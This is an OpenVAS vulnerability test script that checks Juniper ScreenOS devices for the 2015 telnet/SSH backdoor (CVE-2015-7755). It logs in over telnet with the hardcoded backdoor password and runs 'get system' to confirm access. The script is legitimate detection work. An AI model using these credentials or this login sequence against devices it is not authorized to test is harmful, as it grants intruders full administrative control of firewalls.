###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_juniper_screenos_telnet_backdoor_12_2015.nasl 2675 2016-02-17 09:01:04Z benallard $
#
# Backdoor in ScreenOS
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105496");
 script_cve_id("CVE-2015-7755", "CVE-2015-7754");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 2675 $");

 script_name("Backdoor in ScreenOS");

 script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10713&actp=RSS");
 script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10712&actp=RSS");

 script_tag(name: "vuldetect" , value:"Try to login with backdoor credentials");

 script_tag(name: "insight" , value:"It was possible to login using any username and the password: <<< %s(un='%s') = %u");

 script_tag(name:  "solution" , value:"This issue was fixed in ScreenOS 6.2.0r19, 6.3.0r21, and all subsequent releases.");

 script_tag(name: "summary" , value:"ScreenOS is vulnerable to an unauthorized remote administrative access to the device over SSH or telnet.");
 script_tag(name: "affected" , value:"These issues can affect any product or platform running ScreenOS 6.2.0r15 through 6.2.0r18 and 6.3.0r12 through 6.3.0r20.");

 script_tag(name:"solution_type", value: "VendorFix");
 script_tag(name:"qod_type", value:"exploit");

 script_tag(name:"last_modification", value:"$Date: 2016-02-17 10:01:04 +0100 (Wed, 17 Feb 2016) $");
 script_tag(name:"creation_date", value:"2015-12-21 10:35:33 +0100 (Mon, 21 Dec 2015)");
 script_summary("Try to login with backdoor credentials");
 script_category(ACT_ATTACK);
 script_family("General");
 script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/telnet", 23);

 exit(0);
}

include("telnet_func.inc");

port = get_kb_item("Services/telnet");
if( ! port ) port = 23;

if( ! get_port_state( port ) ) exit( 0 );

# it seems that ANY username is accepted using the BD password
user = 'netscreen';
pass = "<<< %s(un='%s') = %u";

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

recv = telnet_negotiate( socket:soc );

if( "login:" >!< recv )
{
  close( soc );
  exit( 0 );
}

send( socket:soc, data: user + '\r\n' );
sleep( 3 );
recv = recv( socket:soc, length:128 );

if( "password:" >!< recv )
{
  close( soc );
  exit( 0 );
}

send( socket:soc, data: pass + '\r\n' );
sleep(3);
recv = recv( socket:soc, length:1024 );

if( ">" >!< recv )
{
  close( soc );
  exit( 0 );
}

send( socket:soc, data: 'get system\r\n' );
sleep(3);

buf = recv( socket:soc, length:1024 );
close( soc );

if("Product Name:" >< buf && "FPGA checksum" >< buf && "Compiled by build_master at" >< buf )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );

